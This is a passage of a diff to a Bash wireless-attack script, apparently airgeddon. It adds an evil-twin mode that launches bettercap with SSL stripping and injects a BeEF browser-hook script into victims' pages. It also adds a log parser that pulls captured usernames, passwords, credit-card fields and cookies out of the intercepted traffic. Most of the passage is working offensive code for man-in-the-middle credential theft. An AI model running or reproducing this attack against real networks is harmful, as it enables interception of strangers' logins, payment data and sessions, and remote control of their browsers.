+	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} --disable-parsers URL,HTTPS,DHCP --no-http-logs --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+
+	if [ ${bettercap_log} -eq 1 ]; then
+		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+	fi
+
+	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
@@ -7829,6 +8165,62 @@ function parse_ettercap_log() {
 	else
 		language_strings "${language}" 306 "blue"
 		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
+	fi
+
+	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
+	language_strings "${language}" 115 "read"
+}
+
+#Parse bettercap log searching for captured passwords
+function parse_bettercap_log() {
+
+	echo
+	language_strings "${language}" 304 "blue"
+
+	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
+	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
+	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | egrep -i ${regexp} | egrep -vi ${regexp2})
+
+	{
+	echo ""
+	date +%Y-%m-%d
+	echo "${et_misc_texts[${language},8]}"
+	echo ""
+	echo "BSSID: ${bssid}"
+	echo "${et_misc_texts[${language},1]}: ${channel}"
+	echo "ESSID: ${essid}"
+	echo ""
+	echo "---------------"
+	echo ""
+	} >> "${tmpdir}parsed_file"
+
+	pass_counter=0
+	captured_cookies=()
+	for cpass in "${BETTERCAPLOG[@]}"; do
+		if [[ ${cpass} =~ COOKIE ]]; then
+			repeated_cookie=0
+			for item in "${captured_cookies[@]}"; do
+				if [ "${item}" = "${cpass}" ]; then
+					repeated_cookie=1
+					break
+				fi
+			done
+			if [ ${repeated_cookie} -eq 0 ]; then
+				captured_cookies+=("${cpass}")
+				echo "${cpass}" >> "${tmpdir}parsed_file"
+				pass_counter=$((pass_counter + 1))
+			fi
+		else
+			echo "${cpass}" >> "${tmpdir}parsed_file"
+			pass_counter=$((pass_counter + 1))
+		fi
+	done
+
+	if [ ${pass_counter} -eq 0 ]; then
+		language_strings "${language}" 305 "yellow"
+	else
+		language_strings "${language}" 399 "blue"
+		cp "${tmpdir}parsed_file" "${bettercap_logpath}" > /dev/null 2>&1
 	fi
 
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
@@ -8203,6 +8595,10 @@ function validate_path() {
 				suggested_filename="${default_ettercaplogfilename}"
 				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
 			;;
+			"bettercaplog")
+				suggested_filename="${default_bettercaplogfilename}"
+				bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
+			;;
 			"writeethandshake")
 				et_handshake="${pathname}${standardhandshake_filename}"
 				suggested_filename="${standardhandshake_filename}"
@@ -8289,6 +8685,14 @@ function read_path() {
 				ettercap_logpath="${default_ettercap_logpath}"
 			fi
 			validate_path "${ettercap_logpath}" "${1}"
+		;;
+		"bettercaplog")
+			language_strings "${language}" 398 "green"
+			read_and_clean_path "bettercap_logpath"
+			if [ -z "${bettercap_logpath}" ]; then
+				bettercap_logpath="${default_bettercap_logpath}"
+			fi
+			validate_path "${bettercap_logpath}" "${1}"
 		;;
 		"ethandshake")
 			language_strings "${language}" 154 "green"
@@ -8829,6 +9233,9 @@ function et_prerequisites() {
 		"et_sniffing_sslstrip")
 			language_strings "${language}" 292 "title"
 		;;
+		"et_sniffing_sslstrip2")
+			language_strings "${language}" 397 "title"
+		;;
 		"et_captive_portal")
 			language_strings "${language}" 293 "title"
 		;;
@@ -8903,9 +9310,9 @@ function et_prerequisites() {
 
 	if [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
 		manage_ettercap_log
-	fi
-
-	if [ "${et_mode}" = "et_captive_portal" ]; then
+	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+		manage_bettercap_log
+	elif [ "${et_mode}" = "et_captive_portal" ]; then
 		manage_captive_portal_log
 		language_strings "${language}" 115 "read"
 		set_captive_portal_language
@@ -8927,6 +9334,9 @@ function et_prerequisites() {
 		;;
 		"et_sniffing_sslstrip")
 			exec_et_sniffing_sslstrip_attack
+		;;
+		"et_sniffing_sslstrip2")
+			exec_et_sniffing_sslstrip2_attack
 		;;
 		"et_captive_portal")
 			exec_et_captive_portal_attack
@@ -9336,6 +9746,7 @@ function exit_script_option() {
 		killall dhcpd > /dev/null 2>&1
 		killall hostapd > /dev/null 2>&1
 		killall lighttpd > /dev/null 2>&1
+		kill_beef
 		time_loop
 		echo -e "${green_color} Ok\r${normal_color}"
 	fi
@@ -9369,6 +9780,7 @@ function hardcore_exit() {
 		killall dhcpd > /dev/null 2>&1
 		killall hostapd > /dev/null 2>&1
 		killall lighttpd > /dev/null 2>&1
+		kill_beef
 	fi
 
 	exit ${exit_code}
@@ -9889,7 +10301,7 @@ function check_compatibility() {
 		if ! hash "${i}" 2> /dev/null; then
 			echo -ne "${red_color} Error${normal_color}"
 			essential_toolsok=0
-			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 			echo -e "\r"
 		else
 			echo -e "${green_color} Ok\r${normal_color}"
@@ -9906,7 +10318,7 @@ function check_compatibility() {
 		if ! hash "${i}" 2> /dev/null; then
 			echo -ne "${red_color} Error${normal_color}"
 			optional_toolsok=0
-			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 			echo -e "\r"
 		else
 			echo -e "${green_color} Ok\r${normal_color}"
@@ -9926,7 +10338,7 @@ function check_compatibility() {
 			if ! hash "${i}" 2> /dev/null; then
 				echo -ne "${red_color} Error${normal_color}"
 				update_toolsok=0
-				echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
+				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 				echo -e "\r"
 			else
 				echo -e "${green_color} Ok\r${normal_color}"
@@ -10092,6 +10504,7 @@ function initialize_script_settings() {
 	networkmanager_cmd="service network-manager restart"
 	is_arm=0
 	pin_dbfile_checked=0
+	beef_found=0
 }
 
 #Detect screen resolution if possible
@@ -10204,6 +10617,8 @@ function welcome() {
 	fi
 
 	detect_screen_resolution
+	set_possible_aliases
+	initialize_optional_tools_values
 
 	if [ ${debug_mode} -eq 0 ]; then
 		language_strings "${language}" 86 "title"
@@ -10422,6 +10837,7 @@ function remove_warnings() {
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
+	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
 	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
